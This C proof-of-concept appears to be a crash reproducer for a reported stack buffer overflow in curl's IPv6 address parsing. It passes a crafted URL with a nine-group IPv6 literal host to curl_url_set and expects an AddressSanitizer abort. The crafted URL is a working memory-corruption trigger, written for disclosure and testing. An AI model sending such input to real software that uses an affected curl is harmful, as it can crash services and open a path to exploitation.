/*
 * PoC: an attacker-controlled URL carrying a malformed IPv6 literal host
 * (nine 16-bit groups followed by more address text) is parsed through
 * curl's public URL API. The host text is passed to
 * curlx_inet_pton(AF_INET6, ...) which overflows its on-stack 16-byte
 * address buffer while storing the ninth group.
 *
 * Expected: aborts under AddressSanitizer (stack-buffer-overflow).
 */
#include <stdio.h>
#include <curl/curl.h>

/* make the sanitizer report terminate the process with SIGABRT when the
   environment does not dictate otherwise */
#if defined(__SANITIZE_ADDRESS__)
const char *__asan_default_options(void)
{
  return "abort_on_error=1";
}
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
const char *__asan_default_options(void)
{
  return "abort_on_error=1";
}
#endif
#endif

int main(void)
{
  CURLU *u;
  CURLUcode uc;

  curl_global_init(CURL_GLOBAL_ALL);

  u = curl_url();
  if(!u) {
    fprintf(stderr, "curl_url() failed\n");
    return 2;
  }

  /* nine full groups with trailing text: not a valid IPv6 address, but
     the parser writes the ninth 16-bit group past its stack buffer */
  uc = curl_url_set(u, CURLUPART_URL,
                    "http://[1:2:3:4:5:6:7:8:9:a]/", 0);
  printf("curl_url_set -> %d (%s)\n", (int)uc, curl_url_strerror(uc));

  curl_url_cleanup(u);
  curl_global_cleanup();
  return 0;
}
